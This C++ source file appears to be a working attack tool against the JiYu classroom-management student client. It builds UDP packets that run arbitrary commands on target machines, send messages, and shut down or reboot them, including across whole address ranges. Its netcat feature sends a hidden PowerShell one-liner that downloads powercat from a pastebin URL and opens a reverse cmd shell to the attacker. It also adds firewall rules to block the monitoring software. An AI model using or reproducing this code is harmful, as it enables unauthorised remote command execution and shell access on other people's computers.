        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, 0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    },
};

const int JiYu_Attack::cmdContentBegin[2] = {56, 578};

const std::string JiYu_Attack::nc_ps_url = "https://pastebin.com/raw/u7zARPaN";

std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
    std::vector<std::string> ret;
    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(std::regex_match(rawIP, pattern)) {
        ret.push_back(rawIP);
        return ret;
    }
    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))-(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(std::regex_match(rawIP, pattern)) {
        std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
        std::string lStr = rawIP.substr(rawIP.rfind('.') + 1, rawIP.find('-') - rawIP.rfind('.') - 1);
        std::string rStr = rawIP.substr(rawIP.find('-') + 1);
        int l = strToInt(lStr), r = strToInt(rStr);
        for(int i = l; i <= r; i++) {
            ret.push_back(segPrefix + std::to_string(i));
        }
        return ret;
    }
    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))/24$");
    if(std::regex_match(rawIP, pattern)) {
        std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
        for(int i = 1; i < 255; i++) {
            ret.push_back(segPrefix + std::to_string(i));
        }
        return ret;
    }
    logger->log(Logger::IERROR, "非法的 IP 地址格式。");
    return ret;
}

int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
    int ret = 0;
    auto data = cmdCodePrefix[CMD];
#ifdef _MSC_VER
    memcpy_s(&data[cmdContentBegin[CMD]], (data.size() - cmdContentBegin[CMD]) * sizeof(BYTE), &cmd[0], cmd.size() * sizeof(BYTE));
#else
    memcpy(&data[cmdContentBegin[CMD]], &cmd[0], cmd.size() * sizeof(BYTE));
#endif
    auto IPs = IPParser(rawIP);
    for(auto IP: IPs) {
        ret |= client->send(IP, port, data);
    }
    return ret;
}

int JiYu_Attack::sendMsg(std::string rawIP, int port, std::string msg) {
    int ret = 0;
    auto data = cmdCodePrefix[MSG];
#ifdef _MSC_VER
    memcpy_s(&data[cmdContentBegin[MSG]], (data.size() - cmdContentBegin[MSG]) * sizeof(BYTE), &msg[0], msg.size() * sizeof(BYTE));
#else
    memcpy(&data[cmdContentBegin[MSG]], &msg[0], msg.size() * sizeof(BYTE));
#endif
    auto IPs = IPParser(rawIP);
    for(auto IP: IPs) {
        ret |= client->send(IP, port, data);
    }
    return ret;
}

int JiYu_Attack::sendShutdown(std::string rawIP, int port) {
    int ret = 0;
    auto data = cmdCodePrefix[SHUTDOWN];
    auto IPs = IPParser(rawIP);
    for(auto IP: IPs) {
        ret |= client->send(IP, port, data);
    }
    return ret;
}

int JiYu_Attack::sendReboot(std::string rawIP, int port) {
    int ret = 0;
    auto data = cmdCodePrefix[SHUTDOWN];
    auto IPs = IPParser(rawIP);
    for(auto IP: IPs) {
        ret |= client->send(IP, port, data);
    }
    return ret;
}

struct NetcatInfo {
    JiYu_Attack* jyAtk;
    std::string IP;
    int port;
    int ncport;
};

DWORD WINAPI netcat_remote(LPVOID lpParameter) {
    NetcatInfo ncInfo = *(NetcatInfo*)lpParameter;
    ncInfo.jyAtk->sendCmd(
        ncInfo.IP,
        ncInfo.port,
        "powershell -WindowStyle Hidden IEX (New-Object System.Net.Webclient).DownloadString('" + JiYu_Attack::nc_ps_url +
        "');powercat -c " + ncInfo.jyAtk->client->localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
    );
    return 0;
}

int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(!std::regex_match(IP, pattern)) {
        return 1;
    }
    NetcatInfo ncInfo;
    ncInfo.jyAtk = this;
    ncInfo.IP = IP;
    ncInfo.port = port;
    ncInfo.ncport = ncport;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)netcat_remote, &ncInfo, 0, NULL);
    printf("正在监听 %d 端口的 netcat……\n", ncport);
    system((
        "powershell IEX (New-Object System.Net.Webclient).DownloadString('" + nc_ps_url +
        "');powercat -l -p " + std::to_string(ncport)
    ).c_str());
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

int JiYu_Attack::breakScreenControl() {
    if(system("net session >nul 2>&1")) {
        return 3;
    }
    system("sc config MpsSvc start=auto >nul 2>&1");
    system("net start MpsSvc >nul 2>&1");
    system("netsh advfirewall set allprofiles state on >nul 2>&1");
    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=block >nul 2>&1");
    return 0;
}

int JiYu_Attack::continueScreenControl() {
    if(system("net session >nul 2>&1")) {
        return 3;
    }
    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=allow >nul 2>&1");
    return 0;
}

auto jyAtk = new JiYu_Attack;

void startUI() {
    printf("------------------- Github Repository -------------------\n    https://github.com/pbw-Kevin/JiYu-UDP-Attack-Cpp\n\nJiyu UDP Attack Cpp 用户界面\n输入指令以继续。输入 help 以获取帮助。输入 exit 以退出。\n");
    std::string opt;
    std::string IP;
    int port = 4705, ncport = 8888, loopCount = 1, loopInterval = 22;
    printf(">>> ");
    while(std::cin >> opt) {
        if(opt == "exit") {
            break;
        }
        else if(opt == "h" || opt == "help") {
            printf("使用方法：\n先配置信息，然后执行。信息会存储，可以反复使用。\n\n用于配置信息的命令：\n  i(ip)     指定目标机的 IP。\n  p         指定监听的端口。默认值为 4705。\n  l         指定命令的循环次数。默认值为 1。\n  t         指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  n(ncport) 指定 nc 命令的监听端口。默认值为 8888。\n\n用于执行的命令：\n  h(help) 显示帮助文本。\n  config  显示当前的配置信息。\n  m(msg)  发送信息。\n  c       在目标机上运行指定命令。\n  e       加载额外选项。\n\ne 命令的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
        }
        else if(opt == "i" || opt == "ip") {
            printf("输入目标机的 IP：");
            std::cin >> IP;
        }
        else if(opt == "p" || opt == "port") {
            printf("输入学生端的端口号：");
            scanf("%d", &port);
        }
        else if(opt == "n" || opt == "ncport") {
            printf("输入 netcat 监听的端口号：");
            scanf("%d", &ncport);
        }
        else if(opt == "l") {
            printf("输入命令的循环次数：");
            scanf("%d", &loopCount);
        }
        else if(opt == "t") {
            printf("输入两次循环之间的时间间隔，单位为秒：");
            scanf("%d", &loopInterval);
        }
        else if(opt  == "config") {
            printf("指定的 IP 地址：%s\n", IP.c_str());
            printf("指定的监听端口：%d\n", port);
            printf("指定的 netcat 监听端口：%d\n", ncport);
            printf("指定的命令循环次数：%d\n", loopCount);
            printf("指定的两次次循环之间的时间间隔，单位为秒：%d\n", loopInterval);
        }
        else if(opt == "m" || opt == "msg") {
            if(IP == "") {
                printf("缺少 IP。\n");
            }
            else if(port < 0 || port > 65535) {
                printf("非法的端口号。\n");
            }
            else {
                std::string msg;
                printf("输入消息内容：\n");
                getchar();
                std::getline(std::cin, msg);
                jyAtk->sendMsg(IP, port, msg);
                printf("发送完毕。\n");
            }
        }
        else if(opt == "c") {
            if(IP == "") {
                printf("缺少 IP。\n");
            }
            else if(port < 0 || port > 65535) {
                printf("非法的端口号。\n");
            }
            else {
                std::string cmd;
                printf("输入指令内容：\n");
                getchar();
                std::getline(std::cin, cmd);
                jyAtk->sendCmd(IP, port, cmd);
                printf("发送完毕。\n");
            }
        }
        else if(opt == "e") {
            std::string extraOpt;
            printf("输入额外选项：");
            std::cin >> extraOpt;
            if(extraOpt == "g") {
                auto localIPs = jyAtk->client->getLocalIPs();
                printf("你的本地 IP 地址：");
                if(localIPs.size()) {
                    putchar('\n');
                    for(auto i: localIPs) {
                        printf("%s\n", i.c_str());
                    }
                    std::vector<int> ports;
                    for(auto i: localIPs) {
                        auto port = jyAtk->client->getStudentPorts(i);
                        ports.insert(ports.end(), port.begin(), port.end());
                    }
                    std::sort(ports.begin(), ports.end());
                    ports.erase(std::unique(ports.begin(), ports.end()), ports.end());
                    printf("\n学生端监听的端口：");
                    if(ports.size()) {
                        putchar('\n');
                        for(auto i: ports) {
                            printf("%d\n", i);
                        }
                    }
                    else {
                        printf("未找到\n");
                    }
                }
                else {
                    printf("未找到\n");
                }
            }
            else if(extraOpt == "break") {
                if(jyAtk->breakScreenControl() == 3) {
                    printf("需要管理员权限。\n");
                }
                else printf("已退出屏幕控制。\n");
            }
            else if(extraOpt == "continue") {
                if(jyAtk->continueScreenControl() == 3) {
                    printf("需要管理员权限。\n");
                }
                else printf("已恢复屏幕控制。\n");
            }
            else if(extraOpt == "r") {
                if(IP == "") {
                    printf("缺少 IP。\n");
                }
                else if(port < 0 || port > 65535) {
                    printf("非法的端口号。\n");
                }
                else {
                    jyAtk->sendReboot(IP, port);
                    printf("发送完毕。\n");
                }
            }
            else if(extraOpt == "s") {
                if(IP == "") {
                    printf("缺少 IP。\n");
                }
                else if(port < 0 || port > 65535) {
                    printf("非法的端口号。\n");
                }
                else {
                    jyAtk->sendShutdown(IP, port);
                    printf("发送完毕。\n");
                }
            }
            else if(extraOpt == "nc") {
                if(IP == "") {
                    printf("缺少 IP。\n");
                }
                else if(port < 0 || port > 65535) {
                    printf("非法的端口号。\n");
                }
                else if(port < 0 || port > 65535) {
                    printf("非法的 netcat 端口号。\n");
                }
                else {
                    jyAtk->netcat(IP, port, ncport);
                    printf("\nNetcat 已断开连接。\n如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n");
                }
            }
            else {
                printf("未知的额外选项。请输入 help 以获取帮助。\n");
            }
        }
        else {
            printf("未知的指令。请输入 help 以获取帮助。\n");
        }
        printf(">>> ");
    }
    return;
}

std::vector<ParamOpt> genParamOpts() {
    std::vector<ParamOpt> paramOpts;
    ParamOpt opt;
    opt.id = "help";
    opt.opt = 'h';
    opt.longopt = "help";
    paramOpts.push_back(opt);
    opt.id = "ip";
    opt.opt = 'i';
    opt.longopt = "ip";
    opt.withParam = true;
    paramOpts.push_back(opt);
    opt.id = "port";
    opt.opt = 'p';
    opt.longopt = "port";
    opt.withParam = true;
    opt.defaultvalue = "4705";
    paramOpts.push_back(opt);
    opt.id = "msg";
    opt.opt = 'm';
    opt.longopt = "msg";
    opt.withParam = true;
    paramOpts.push_back(opt);
    opt.id = "cmd";
    opt.opt = 'c';
    opt.withParam = true;
    paramOpts.push_back(opt);
    opt.id = "e";
    opt.opt = 'e';
    opt.withParam = true;
    paramOpts.push_back(opt);
    opt.id = "l";
    opt.opt = 'l';
    opt.withParam = true;
    opt.defaultvalue = "1";
    paramOpts.push_back(opt);
    opt.id = "t";
    opt.opt = 't';
    opt.withParam = true;
    opt.defaultvalue = "22";
    paramOpts.push_back(opt);
    opt.id = "ncport";
    opt.opt = 'n';
    opt.longopt = "ncport";
    opt.withParam = true;
    opt.defaultvalue = "8888";
    paramOpts.push_back(opt);
    return paramOpts;
}

int main(int argc, char *argv[]) {
    if(argc == 1) {
        startUI();
        return 0;
    }
    auto paramOpts = genParamOpts();
    auto paramRets = GetParams(argc, argv, paramOpts);
    if(GetParamfromParams("help", paramRets).exists) {
        printf("------------------- Github Repository -------------------\n    https://github.com/pbw-Kevin/JiYu-UDP-Attack-Cpp\n\n使用方法：\n直接调用以唤起用户界面：\nmain\n\n通过命令行调用：\nmain [-h(--help) |\n  [-i(--i(--ip)) <IP>] [-p <Port>] [-m(--msg) <Message> | -c <Command>]\n  [-l <Loop Count>] [-t <Loop Time Interval>]\n  [-e <Extra Option>] [-n(--ncport) <NC Port>]]\n\n参数列表：\n  -h(--help)              显示帮助文本。\n  -i(--ip) <IP>           指定目标机的 IP。\n  -p <Port>               指定监听的端口。默认值为 4705。\n  -m(--msg) <Message>     指定要发送的信息。\n  -c <Command>            在目标机上运行指定命令。\n  -e <Extra Option>       加载额外选项。\n  -l <Loop Count>         指定命令的循环次数。默认值为 1。\n  -t <Loop Time Interval> 指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  -n(--ncport) <NC Port>  指定 nc 命令的监听端口。默认值为 8888。\n\n-e 参数的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
        return 0;
    }
    auto extraOpt = GetParamfromParams("e", paramRets);
    if(extraOpt.exists) {
        if(extraOpt.value == "g") {
            auto localIPs = jyAtk->client->getLocalIPs();
            printf("你的本地 IP 地址：");
            if(localIPs.size()) {
                putchar('\n');
                for(auto i: localIPs) {
                    printf("%s\n", i.c_str());
                }
            }
            else {
                printf("未找到\n");
                return 0;
            }
            std::vector<int> ports;
            for(auto i: localIPs) {
                auto port = jyAtk->client->getStudentPorts(i);
                ports.insert(ports.end(), port.begin(), port.end());
            }
            std::sort(ports.begin(), ports.end());
            ports.erase(std::unique(ports.begin(), ports.end()), ports.end());
            printf("\n学生端监听的端口：");
            if(ports.size()) {
                putchar('\n');
                for(auto i: ports) {
                    printf("%d\n", i);
                }
            }
            else {
                printf("未找到\n");
            }
            return 0;
        }
        if(extraOpt.value == "break") {
            if(jyAtk->breakScreenControl() == 3) {
                printf("需要管理员权限。\n");
            }
            else printf("已退出屏幕控制。\n");
            return 0;
        }
        if(extraOpt.value == "continue") {
            if(jyAtk->continueScreenControl() == 3) {
                printf("需要管理员权限。\n");
            }
            else printf("已恢复屏幕控制。\n");
            return 0;
        }
    }
    if(!GetParamfromParams("ip", paramRets).exists) {
        printf("需要 IP 地址。\n");
        return 0;
    }
    std::string rawIP = GetParamfromParams("ip", paramRets).value;
    int port = strToInt(GetParamfromParams("port", paramRets).value);
    if(extraOpt.exists) {
        if(extraOpt.value == "nc") {
            int ncport = strToInt(GetParamfromParams("ncport", paramRets).value);
            jyAtk->netcat(rawIP, port, ncport);
            printf("\nNetcat 已断开连接。\n如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n");
            return 0;
        }
    }
    int loopCount = strToInt(GetParamfromParams("l", paramRets).value);
    int loopInterval = strToInt(GetParamfromParams("t", paramRets).value);
    if(GetParamfromParams("msg", paramRets).exists) {
        std::string msg = GetParamfromParams("msg", paramRets).value;
        if(msg != "") {
            for(int i = 1; i <= loopCount; i++) {
                if(i > 1) Sleep(loopInterval * 1000);
                jyAtk->sendMsg(rawIP, port, msg);
                if(loopCount > 1) {
                    printf("第 %d 次发送完毕。\n", i);
                }
            }
            printf("发送完毕。\n");
            return 0;
        }
    }
    if(GetParamfromParams("cmd", paramRets).exists) {
        std::string cmd = GetParamfromParams("cmd", paramRets).value;
        if(cmd != "") {
            for(int i = 1; i <= loopCount; i++) {
                if(i > 1) Sleep(loopInterval * 1000);
                jyAtk->sendCmd(rawIP, port, cmd);
                if(loopCount > 1) {
                    printf("第 %d 次发送完毕。\n", i);
                }
            }
            printf("发送完毕。\n");
            return 0;
        }
    }
    if(extraOpt.exists) {
        if(extraOpt.value == "s") {
            for(int i = 1; i <= loopCount; i++) {
                if(i > 1) Sleep(loopInterval * 1000);
                jyAtk->sendShutdown(rawIP, port);
                if(loopCount > 1) {
                    printf("第 %d 次发送完毕。\n", i);
                }
            }
            printf("发送完毕。\n");
            return 0;
        }
        if(extraOpt.value == "r") {
            for(int i = 1; i <= loopCount; i++) {
                if(i > 1) Sleep(loopInterval * 1000);
                jyAtk->sendReboot(rawIP, port);
                if(loopCount > 1) {
                    printf("第 %d 次发送完毕。\n", i);
                }
            }
            printf("发送完毕。\n");
            return 0;
        }
    }
    printf("参数出现问题。请使用 -h 参数以获取帮助。\n");
    return 0;
}

#else
#error "Invalid system. Windows required."
#endif // _WIN32
